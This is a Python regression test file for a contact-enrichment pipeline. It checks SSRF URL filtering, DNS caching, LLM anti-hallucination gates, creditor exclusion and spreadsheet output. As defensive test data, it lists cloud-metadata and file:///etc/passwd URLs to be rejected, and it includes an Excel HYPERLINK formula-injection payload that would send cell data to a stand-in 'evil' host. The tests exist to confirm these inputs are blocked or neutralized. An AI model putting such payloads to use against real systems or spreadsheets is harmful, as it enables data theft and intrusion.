"""Regression tests for the security/reliability guards hardened after review.

Run with:  python tests/test_guards.py

Covers: SSRF URL validation, MX transient-vs-definitive caching, the resolution
anti-hallucination gate, Excel formula-injection neutralization, the creditor
port/userinfo bypass, and partial-run (--limit/--rows) output alignment.
"""

import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import openpyxl

from pipeline import contact_finder, output, resolution, web
from pipeline.cache import Cache
from pipeline.config import Config
from pipeline.models import (
    Contact,
    ContactType,
    EnrichmentRecord,
    FullNameType,
    Parsed,
    Resolution,
    ResolutionStatus,
    RowStatus,
    SourceRow,
    Tier,
)
from pipeline.web import SearchBudget


def test_ssrf_url_filter():
    assert web.is_public_url("https://example.com/")  # resolves to a public IP
    assert not web.is_public_url("http://127.0.0.1/")
    assert not web.is_public_url("http://localhost/")
    assert not web.is_public_url("http://169.254.169.254/latest/meta-data/")
    assert not web.is_public_url("http://10.0.0.5/internal")
    assert not web.is_public_url("file:///etc/passwd")
    assert not web.is_public_url("ftp://example.com/")
    # A public dual-stack host with a NAT64 address must pass.
    assert web.is_public_url("https://www.concordhospital.org/")
    print("ssrf url filter: OK")


def test_ssrf_classification():
    # Unit-level: the danger classification must accept reserved-but-global
    # NAT64 and reject the internal ranges, without any DNS dependency.
    import ipaddress

    def dangerous(addr):
        ip = ipaddress.ip_address(addr)
        return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_unspecified

    assert not dangerous("64:ff9b::211:a153")  # NAT64, reserved but routable
    assert not dangerous("2.17.161.75")        # public v4
    assert dangerous("169.254.169.254")        # cloud metadata
    assert dangerous("127.0.0.1")
    assert dangerous("10.0.0.5")
    assert dangerous("fd00::1")                 # unique-local v6
    print("ssrf classification: OK")


def test_mx_transient_not_cached():
    with tempfile.TemporaryDirectory() as tmp:
        cache = Cache(Path(tmp))
        import dns.resolver

        # Definitive negative IS cached.
        calls = {"n": 0}
        orig = dns.resolver.resolve

        def nxdomain(*a, **k):
            calls["n"] += 1
            raise dns.resolver.NXDOMAIN()

        dns.resolver.resolve = nxdomain
        try:
            assert contact_finder._mx_valid(cache, "no-such-domain.invalid") is False
            assert contact_finder._mx_valid(cache, "no-such-domain.invalid") is False
            assert calls["n"] == 1, "definitive negative should be cached"
        finally:
            dns.resolver.resolve = orig

        # Transient failure is NOT cached (so a rerun can recover).
        tcalls = {"n": 0}

        def timeout(*a, **k):
            tcalls["n"] += 1
            raise dns.resolver.LifetimeTimeout()

        dns.resolver.resolve = timeout
        try:
            assert contact_finder._mx_valid(cache, "transient.example") is False
            assert contact_finder._mx_valid(cache, "transient.example") is False
            assert tcalls["n"] == 2, "transient failure must not be cached"
            assert cache.get("mx", "transient.example") is None
        finally:
            dns.resolver.resolve = orig

        # No MX but an A record is still deliverable.
        def no_mx_has_a(domain, rdtype, *a, **k):
            if rdtype == "MX":
                raise dns.resolver.NoAnswer()
            return ["93.184.216.34"]

        dns.resolver.resolve = no_mx_has_a
        try:
            assert contact_finder._mx_valid(cache, "implicit-mx.example") is True
        finally:
            dns.resolver.resolve = orig
    print("mx transient caching: OK")


PARSED = Parsed("DUVAL MOTORS", None, None, FullNameType.PERSON, Tier.MEDIUM, ["DUVAL MOTORS"])
ROW = SourceRow(1, {}, "Joe Rich", "100 Main St  Norfolk VA 23510 USA", "DUVAL MOTORS", "+1 555")
HITS = {"organic": [{"title": "Duval Motors", "snippet": "Norfolk VA",
                     "link": "https://duvalmotors.com"}]}


class _LLM:
    def __init__(self, verdict):
        self._verdict = verdict

    def json(self, model, system, user, schema):
        return self._verdict


def test_anti_hallucination_gate():
    with tempfile.TemporaryDirectory() as tmp:
        cache = Cache(Path(tmp))
        cfg = Config("stub", "stub", Path("x"), Path("y"), Path(tmp), 6, ("fedex.com",))
        resolution.serper_search = lambda c, k, q, num=5: HITS

        # A domain not in the chosen URL is rejected.
        invented = _LLM({"result_index": 1, "domain": "totally-invented.com",
                         "reasoning": "x", "confidence": 0.9})
        res = resolution.resolve(PARSED, ROW, cache, cfg, invented, SearchBudget(6))
        assert res.domain is None, "invented domain leaked"

        # Substring near-miss "me.com" must NOT pass for "duvalmotors.com".
        nearmiss = _LLM({"result_index": 1, "domain": "me.com",
                         "reasoning": "x", "confidence": 0.9})
        res = resolution.resolve(PARSED, ROW, cache, cfg, nearmiss, SearchBudget(6))
        assert res.domain is None, "substring near-miss wrongly accepted"

        # Correct domain (even with www) is accepted and normalized.
        good = _LLM({"result_index": 1, "domain": "www.duvalmotors.com",
                     "reasoning": "match", "confidence": 0.9})
        res = resolution.resolve(PARSED, ROW, cache, cfg, good, SearchBudget(6))
        assert res.domain == "duvalmotors.com", res.domain
    print("anti-hallucination gate: OK")


def test_directory_filter():
    # A directory must never become the resolved company domain.
    with tempfile.TemporaryDirectory() as tmp:
        cache = Cache(Path(tmp))
        cfg = Config("stub", "stub", Path("x"), Path("y"), Path(tmp), 6, ("fedex.com",))
        directory_hits = {"organic": [
            {"title": "Zumpano Enterprises - Yelp", "snippet": "Norcross GA",
             "link": "https://www.yelp.com/biz/zumpano-enterprises"},
        ]}
        resolution.serper_search = lambda c, k, q, num=5: directory_hits
        # Directories are filtered out before the judge sees them.
        llm = _LLM({"result_index": 1, "domain": "yelp.com", "reasoning": "listed",
                    "confidence": 0.9})
        res = resolution.resolve(PARSED, ROW, cache, cfg, llm, SearchBudget(6))
        assert res.domain is None, f"directory leaked as company domain: {res.domain}"
        assert web.is_directory("yelp.com") and web.is_directory("business.yelp.com")
        assert not web.is_directory("datafinancial.com")
    print("directory filter: OK")


def test_followup_query_escalation():
    # A grounded follow-up query is searched before giving up.
    with tempfile.TemporaryDirectory() as tmp:
        cache = Cache(Path(tmp))
        cfg = Config("stub", "stub", Path("x"), Path("y"), Path(tmp), 6, ("fedex.com",))
        registry_hits = {"organic": [
            {"title": "Sunbiz registry: DUVAL MOTORS AT THE AVENUES, INC.",
             "snippet": "Registered Jacksonville FL", "link": "https://search.sunbiz.org/x"},
        ]}
        official_hits = {"organic": [
            {"title": "Duval Motors at the Avenues | Jacksonville FL",
             "snippet": "Official dealership site.", "link": "https://duvalmotors.com"},
        ]}

        def serper(c, k, q, num=5):
            return official_hits if "AVENUES" in q.upper() else registry_hits

        class EscalatingLLM:
            def json(self, model, system, user, schema):
                if "duvalmotors.com" in user:
                    return {"result_index": 2, "domain": "duvalmotors.com",
                            "reasoning": "official site", "confidence": 0.9}
                return {"result_index": -1, "domain": "",
                        "reasoning": "registry only, no official site in results",
                        "confidence": 0.5,
                        "followup_query": '"DUVAL MOTORS AT THE AVENUES" Jacksonville FL'}

        resolution.serper_search = serper
        budget = SearchBudget(6)
        res = resolution.resolve(PARSED, ROW, cache, cfg, EscalatingLLM(), budget)
        assert res.domain == "duvalmotors.com", res
        assert budget.used == 2, f"expected followup to run on query 2, used {budget.used}"
    print("followup query escalation: OK")


def test_current_name_must_be_grounded():
    # A current_name unlocks affinity only if grounded in the results.
    with tempfile.TemporaryDirectory() as tmp:
        cache = Cache(Path(tmp))
        cfg = Config("stub", "stub", Path("x"), Path("y"), Path(tmp), 6, ("fedex.com",))
        parsed = Parsed("L M SCOFIELD", "COMPANY", None, FullNameType.PERSON,
                        Tier.MEDIUM, ["L M SCOFIELD"])
        row = SourceRow(1, {}, "Joe Rich", "1 Main St  Lyndhurst NJ 07071 USA",
                        "L M SCOFIELD COMPANY", "+1 555")

        def hits(snippet):
            return {"organic": [{"title": "Concrete color systems",
                                 "snippet": snippet, "link": "https://usa.sika.com/scofield"}]}

        verdict = {"result_index": 1, "domain": "usa.sika.com",
                   "reasoning": "acquired brand", "confidence": 0.8,
                   "current_name": "Sika Corporation"}

        # Results mention Sika Corporation, so it is accepted.
        resolution.serper_search = lambda c, k, q, num=5: hits(
            "L.M. Scofield is now part of Sika Corporation.")
        res = resolution.resolve(parsed, row, cache, cfg, _LLM(verdict), SearchBudget(6))
        assert res.domain == "usa.sika.com", res
        assert res.legal_name == "Sika Corporation", res.legal_name

        # Results never say Sika Corporation, so affinity rejects.
        resolution.serper_search = lambda c, k, q, num=5: hits(
            "Decorative concrete products since 1915.")
        res = resolution.resolve(parsed, row, cache, cfg, _LLM(verdict), SearchBudget(6))
        assert res.domain is None, f"ungrounded current_name unlocked the gate: {res}"
    print("current_name grounding: OK")


def test_reader_anti_hallucination():
    # The reader never introduces an address or an ungrounded name.
    page = ("Contact us. For accounts payable, reach Jane Smith at jane@acme.com. "
            "General enquiries: info@acme.com.")
    a = Contact("jane@acme.com", None, None, ContactType.GENERIC,
                "https://acme.com/contact", "jane@acme.com", True, "exact")
    b = Contact("info@acme.com", None, None, ContactType.GENERIC,
                "https://acme.com/contact", "info@acme.com", True, "exact")
    contacts = {"jane@acme.com": a, "info@acme.com": b}

    class Reader:
        def json(self, model, system, user, schema):
            return {"annotations": [
                {"email": "jane@acme.com", "name": "Jane Smith",
                 "role": "Accounts Payable", "department": "Finance"},
                {"email": "info@acme.com", "name": "Bob Vanished",  # not in page text
                 "role": "General", "department": ""},
                {"email": "evil@acme.com", "name": "X",  # not in extracted set
                 "role": "", "department": ""},
            ]}

    contact_finder._annotate_contacts(contacts, page, Reader())
    assert a.name == "Jane Smith" and a.type == ContactType.NAMED_PERSON, a
    assert a.role == "accounts payable", a.role
    assert b.name is None and b.type == ContactType.GENERIC, b  # ungrounded name dropped
    assert "evil@acme.com" not in contacts, "reader introduced a non-extracted email"
    print("reader anti-hallucination: OK")


def test_query_suggestions_validated():
    parsed = Parsed("RIVERSIDE INFECTION CONST", None, None, FullNameType.PERSON,
                    Tier.HARD, ["RIVERSIDE INFECTION CONST"])
    row = SourceRow(1, {}, "x", "1 Main St  Frisco TX 75034 USA",
                    "RIVERSIDE INFECTION CONST", "+1 555")

    class Sugg:
        def json(self, model, system, user, schema):
            return {"queries": ["riverside infection control Frisco TX", "",
                                "x" * 200, "riverside infection control Frisco TX"]}

    out = resolution.llm_query_suggestions(parsed, row, Sugg())
    assert out == ["riverside infection control Frisco TX"], out  # blank/overlong/dupe dropped

    class Boom:
        def json(self, *a):
            raise RuntimeError("model down")

    assert resolution.llm_query_suggestions(parsed, row, Boom()) == []  # failure is non-fatal
    print("query suggestions validated: OK")


def test_creditor_port_bypass():
    cfg = Config(None, None, Path("x"), Path("y"), Path("z"), 6, ("fedex.com",))
    assert cfg.is_creditor(web.url_domain("https://fedex.com:443/billing"))
    assert cfg.is_creditor(web.url_domain("https://user@fedex.com/"))
    print("creditor port bypass: OK")


def test_creditor_autodetect_and_exclusion():
    # A creditor named in the input column is excluded.
    from pipeline.ingestion import detect_creditor_names

    rows = [
        SourceRow(1, {"Company issuing the invoice": "ACME COLLECTIONS LLC"}, "x", "a", "DEBTOR CO", "+1"),
        SourceRow(2, {"Company issuing the invoice": "ACME COLLECTIONS LLC"}, "y", "b", "OTHER CO", "+1"),
        SourceRow(3, {}, "z", "c", "NO CREDITOR COLUMN", "+1"),
    ]
    names = detect_creditor_names(rows)
    assert names == ("ACME COLLECTIONS",), names  # legal suffix stripped, de-duped, blank skipped

    cfg = Config("stub", "stub", Path("x"), Path("y"), Path("z"), 6, (), creditor_names=names)
    assert resolution.is_creditor_domain("acmecollections.com", cfg), "name-affinity exclusion failed"
    assert not resolution.is_creditor_domain("debtorco.com", cfg)

    # The env domain list still works on its own.
    env_only = Config("stub", "stub", Path("x"), Path("y"), Path("z"), 6, ("fedex.com",))
    assert resolution.is_creditor_domain("fedex.com", env_only)
    assert not resolution.is_creditor_domain("acme.com", env_only)
    print("creditor autodetect + exclusion: OK")


def test_formula_injection_neutralized():
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        fixture, out = tmp_path / "in.xlsx", tmp_path / "out.xlsx"
        wb = openpyxl.Workbook(); ws = wb.active
        ws.append(["Full name", "Address", "Company name", "Email", "Phone number"])
        ws.append(["Joe Rich", "1 St  Norfolk VA 23510 USA", "DUVAL MOTORS", "", "+1 555"])
        wb.save(fixture)
        rows = __import__("pipeline.ingestion", fromlist=["load_rows"]).load_rows(fixture)
        evil = "=HYPERLINK(\"http://evil/?\"&A1) ap@duvalmotors.com"
        rec = EnrichmentRecord(
            source=rows[0],
            parsed=Parsed("DUVAL MOTORS", None, None, FullNameType.PERSON, Tier.MEDIUM, []),
            resolution=Resolution(ResolutionStatus.RESOLVED, "duvalmotors.com", "Duval Motors", 0.9),
            contacts=[Contact("ap@duvalmotors.com", None, "accounts payable",
                              ContactType.ROLE_SPECIFIC, "https://duvalmotors.com/contact",
                              evil, True, "exact", 0.8)],
            status=RowStatus.ENRICHED)
        output.write_output([rec], fixture, out)
        sheet = openpyxl.load_workbook(out).active
        n = 5  # Evidence is the 5th appended column
        evidence_cell = sheet.cell(3, n + 5)
        assert evidence_cell.data_type != "f", "evidence stored as live formula"
        assert str(evidence_cell.value).startswith("'="), evidence_cell.value
    print("formula injection neutralized: OK")


def test_partial_run_output_alignment():
    with tempfile.TemporaryDirectory() as tmp:
        tmp_path = Path(tmp)
        fixture, out = tmp_path / "in.xlsx", tmp_path / "out.xlsx"
        wb = openpyxl.Workbook(); ws = wb.active
        ws.append(["Full name", "Address", "Company name", "Email", "Phone number"])
        for i in range(1, 6):
            ws.append([f"Person {i}", f"{i} St  City TX 75001 USA", f"CO {i}", "", f"+1 55{i}"])
        wb.save(fixture)
        rows = __import__("pipeline.ingestion", fromlist=["load_rows"]).load_rows(fixture)
        # A single-row run inserts under its own source row.
        rec = EnrichmentRecord(
            source=rows[2],
            parsed=Parsed("CO 3", None, None, FullNameType.PERSON, Tier.MEDIUM, []),
            resolution=Resolution(ResolutionStatus.RESOLVED, "co3.com", "Co 3", 0.9),
            contacts=[Contact("ap@co3.com", None, None, ContactType.ROLE_SPECIFIC,
                              "https://co3.com/contact", "ap@co3.com", True, "exact", 0.7)],
            status=RowStatus.ENRICHED)
        output.write_output([rec], fixture, out)
        sheet = openpyxl.load_workbook(out).active
        # Source row 3 is sheet row 4.
        assert sheet.cell(4, 3).value == "CO 3", "source row 3 misplaced"
        assert sheet.cell(5, 4).value == "ap@co3.com", "enrichment not under source row 3"
        assert sheet.cell(5, 1).fill.fgColor.rgb.endswith("FFF2CC")
    print("partial-run output alignment: OK")


def main() -> None:
    # Restore serper_search so it is not left patched.
    _orig_serper = resolution.serper_search
    try:
        test_ssrf_classification()
        test_ssrf_url_filter()
        test_mx_transient_not_cached()
        test_anti_hallucination_gate()
        test_directory_filter()
        test_followup_query_escalation()
        test_current_name_must_be_grounded()
        test_reader_anti_hallucination()
        test_query_suggestions_validated()
        test_creditor_port_bypass()
        test_creditor_autodetect_and_exclusion()
        test_formula_injection_neutralized()
        test_partial_run_output_alignment()
    finally:
        resolution.serper_search = _orig_serper
    print("\nAll guard tests passed.")


if __name__ == "__main__":
    main()
